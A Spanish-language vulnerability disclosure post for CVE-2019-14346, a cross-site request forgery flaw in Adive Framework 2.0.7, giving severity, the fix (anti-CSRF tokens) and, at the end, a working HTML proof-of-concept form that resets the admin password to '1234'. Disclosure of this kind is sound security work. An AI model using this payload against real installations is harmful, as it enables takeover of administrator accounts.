+++
date = "2019-08-02"
title = "CVE-2019-14346 Adive Framework 2.0.7 - Cross-Site Request Forgery"
author = "Pablo Santiago"
toc = false
+++

Las vulnerabilidadesÂ [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\))Â encontradas en Adive Framework 2.0.7Â **permiten a un usuario malintencionado realizar acciones como cambiar la contraseÃ±a de un usuario**Â a travÃ©s de este ataque. La vulnerabilidad, ha sido asociada alÂ **CVE-2019-14346**.

## CVE-2019-14346

### Adive Framework 2.0.7 â€“ Cross-Site Request Forgery

[![/images/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery_001.png](/images/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery_001.png)](/images/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery_001.png)

[www.adive.es](https://adive.es/)  

- ğŸ“…Â Vulnerabilidad descubierta por Pablo SantiagoÂ elÂ **02/08/2019**
- ğŸ›Â [CVE-2019-14346](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14346)
- ğŸ”—Â Link del softwareÂ [web](https://www.adive.es/)Â y delÂ [github](https://github.com/ferdinandmartin/adive-php7)Â con el proyecto.
- ğŸÂ VersiÃ³n vulnerable =Â **2.0.7** y anteriores probablemente.

**SoluciÃ³n**: AÃ±adir tokens anti-CSRF en las peticiones.

## Vector de ataque / Criticidad de la explotaciÃ³n

### CRITICIDAD -Â ğŸ”´ ALTA ğŸ”´

A travÃ©s de las vulnerabilidadesÂ [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)), un atacanteÂ **podrÃ­a aprovecharse de la confianza que tiene la aplicaciÃ³n sobre los usuarios legÃ­timos**Â para crear un enlace o formulario malicioso que serÃ¡ ejecutado a travÃ©s de estos.

### ParÃ¡metros / Recursos vulnerables

La aplicaciÃ³n no tiene tokens anti-csrf por lo que es vulnerable a ataques de tipo Cross-site Request Forgery. La vulnerabilidad permite la modificaciÃ³n de la contraseÃ±a de cualquier usuario, en este caso la contraseÃ±a del usuario admin una vez que se ejecute el CSRF la contraseÃ±a se cambiara aÂ `1234`Â como se observa en el siguiente ejemplo.

Puedes ver la ejecuciÃ³n del CSRF

[![/images/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery_002.gif](/images/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery_002.gif)](/images/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery_002.gif)

```html
<html>
  <body>
  history.pushState('', '', '/')
    <form action="http://10.12.117.3/adive/admin/config" method="POST">
      <input type="hidden" name="userName" value="admin" />
      <input type="hidden" name="confPermissions" value="1" />
      <input type="hidden" name="pass" value="1234" />
      <input type="hidden" name="cpass" value="1234" />
      <input type="hidden" name="invokeType" value="web" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```